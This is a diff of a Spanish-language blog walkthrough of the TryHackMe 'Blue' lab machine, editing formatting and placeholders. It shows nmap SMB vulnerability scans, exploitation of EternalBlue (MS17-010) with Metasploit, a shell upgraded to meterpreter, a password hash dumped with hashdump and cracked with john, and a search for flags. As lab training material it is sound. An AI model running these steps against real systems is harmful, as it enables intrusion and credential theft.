@@ -12,13 +12,13 @@ En esta ocasión vamos a resolver la máquina _Blue_ de _TryHackMe_. Esta es una
 Primeramente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:
 
 ```
-nmap -p- --open -T5 -v -n <dirección IP> -oG allPorts
+nmap -p- --open -T5 -v -n <dirección IP>
 ```
  
 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:
   
 ``` 
-sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP> -oG allPorts
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP>
 ```
 
 A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:
@@ -32,13 +32,11 @@ A continuación se explican los parámetros utilizados en el escaneo de puertos 
 * min-rate - Emitir paquetes no más lentos que _valor_ por segundo
 * vvv - Triple _verbose_, para obtener mayor información por consola
 * Pn - No aplicar _host discovery_
-* oG - Exportar el escaneo en formato "_grepeable_"
-
   
 Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:
 
 ```  
-nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 <dirección IP> -oN targeted
+nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 <dirección IP>
 ```
   
 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:
@@ -46,7 +44,6 @@ A continuación se explican los parámetros utilizados en el escaneo de versione
 * sC - Scripts básicos de enumeración
 * sV - Versión y servicios que corren bajo los puertos encontrados
 * p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)
-* oN - Exportar el escaneo en formato _Nmap_
 
 Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:
 
@@ -66,30 +63,29 @@ De modo que procederemos a utilizar los scripts específicos con los que cuenta 
 Para poder utilizarlos podemos hacer lo siguiente:
 
 ```  
-nmap --script="smb-vuln*" -p 445 10.10.229.101 -oN smbScan
+nmap --script="smb-vuln*" -p 445 <dirección IP>
 ```
 
 A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del servicio `Samba` con _Nmap_:
   
-  * --script - Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos script que comiencen por _smb-vuln_
+  * script - Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos script que comiencen por _smb-vuln_
   * p - Especificamos a que puertos queremos aplicar este escaneo
-  * oN - Exportar el escaneo en formato _Nmap_
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/4.png)
 
-Como podemos darnos cuenta, esta máquina es vulnerable a MS17-010, o también conocido como `EternalBlue`.
+Como podemos darnos cuenta, esta máquina es vulnerable a `MS17-010`, o también conocido como `EternalBlue`.
 
 ### [](#header-3)Fase De Explotación
 
-Para esta segunda fase, _TryHackMe_ realiza la fase de explotación con el uso de `Metasploit`, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina `Blue`, está pensada para ser explotada mediante el uso de `Metasploit`.
+Para esta segunda fase, _TryHackMe_ realiza la fase de explotación con el uso de `Metasploit`, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina `Blue`, está pensada para ser explotada mediante el uso de _Metasploit_.
 
-Para hacer uso de `Metasploit` tendremos que abrir la aplicación, para ello haremos lo siguiente:
+Para hacer uso de _Metasploit_ tendremos que abrir la aplicación, para ello haremos lo siguiente:
 
 ```  
 msfconsole
 ```
 
-Una vez hemos abierto `Metasploit`, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o `EternalBlue`, cualquiera de las dos formas es válidas.
+Una vez hemos abierto _Metasploit_, procederemos a buscar aquello que queremos explotar, en este caso, `MS17-010`, o `EternalBlue`, cualquiera de las dos formas es válida.
 
 ```    
 search eternalblue
@@ -119,13 +115,13 @@ set RHOST <IP víctima>
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/7.png)
 
-Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos `Metasploit` una _shell_ dentro de la máquina víctima.
+Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos _Metasploit_ una shell dentro de la máquina víctima.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png)
 
-Una vez llegados a este punto, _TryHackMe_ nos pide convertir nuestra _shell_ actual, en `meterpreter`, para ello tendremos que abandonar nuestra sesión actual `Ctrl + Z`.
+Una vez llegados a este punto, _TryHackMe_ nos pide convertir nuestra shell actual, en `meterpreter`, para ello tendremos que abandonar nuestra sesión actual `Ctrl + Z`.
 
-Una vez fuera, tendremos que nuevamente buscar dentro de `Metasploit`, un módulo que nos permita pasar de una shell_ a `meterpreter`.
+Una vez fuera, tendremos que nuevamente buscar dentro de _Metasploit_, un módulo que nos permita pasar de una shell a `meterpreter`.
 
 ```      
 search shell_to_meterpreter
@@ -164,11 +160,11 @@ sessions 1
 
 ### [](#header-3)Escalada De Privilegios
 
-_TryHackMe_ nos indica que a través del comando 'migrate <ID del proceso>', podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos 'NT AUTHORITY\SYSTEM', de modo que no tiene sentido migrar al usuario que ya somos.
+_TryHackMe_ nos indica que a través del comando `migrate <ID del proceso>`, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos `NT AUTHORITY\SYSTEM`, de modo que no tiene sentido migrar al usuario que ya somos.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/11.png)
 
-Antes de pasar a conseguir las 'flags' de la máquina, la plataforma nos sigue enseñando comandos útiles de `Metasploit`, en este caso el comando 'hashdump', con el cual podemos listar todos los usarios del sistema, así como sus contraseñas _hasheadas_. 
+Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de _Metasploit_, en este caso el comando `hashdump`, con el cual podemos listar todos los usarios del sistema, así como sus contraseñas _hasheadas_. 
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/12.png)
 
@@ -183,7 +179,7 @@ sudo apt install john
 En nuestra máquina, crearemos un documento de texto que contenga la contraseña _hasheada_ del usuario, podemos hacerlo de manera manual, o desde la misma terminal:
 
 ```
-echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" >> hash.txt
+echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" >> nombreArchivoTexto.txt
 ```
 
 Una vez creado el archivo de texto, podemos pasar a _crackear_ la contraseña:
@@ -195,11 +191,11 @@ sudo john --format=NT --wordlist=dirección/del/diccionario/rockyou nombreArchiv
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/13.png)
 
 
-Una vez hemos _crackeado_ la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas 'flags'. En este caso existe un total de 3 'flags', las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema _Windows_, por lo que es aconsejable aprender estas locaciones. 
+Una vez hemos _crackeado_ la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema _Windows_, por lo que es aconsejable aprender estas locaciones. 
 
-La primera 'flag' dice que se encuentra en la raíz del sistema, dicho de otra forma, 'Disco Local C'.
+La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, `Disco Local C`.
 
-Para poder navegar dentro de la máquina víctima, podríamos usar el mismo `meterpreter`, sin embargo, en este caso nos manejaremos a través de una _shell_, para ello ejecutaremos el comando _shell_. Una vez hecho esto, podemos ir hacia el directorio 'C:\\', listar su contenido y encontrar la 'flag'.
+Para poder navegar dentro de la máquina víctima, podríamos usar el mismo `meterpreter`, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando `shell`. Una vez hecho esto, podemos ir hacia el directorio `C:\\`, listar su contenido y encontrar la flag.
 
 ```
 cd C:\\
@@ -210,7 +206,7 @@ type flag1.txt
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/14.png)
 
 
-La segunda 'flag' dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, 'C:\Windows\System32\Config'.
+La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, `C:\Windows\System32\Config`.
 
 ```
 cd C:\Windows\System32\Config
@@ -220,7 +216,7 @@ type flag2.txt
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/15.png)
 
-La última 'flag' dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas "bastante interesantes", personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo `flag3.txt`, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:
+La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas "bastante interesantes", personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo `flag3.txt`, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:
 
 ```  
 cd \
@@ -229,7 +225,7 @@ dir flag3.txt /s /p
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/16.png)
 
-Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última `flag`, de modo que nos dirigiremos a esa ubicación para leer la 'flag'.
+Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag.
 
 ```  
 cd C:\Users\Jon\Documents
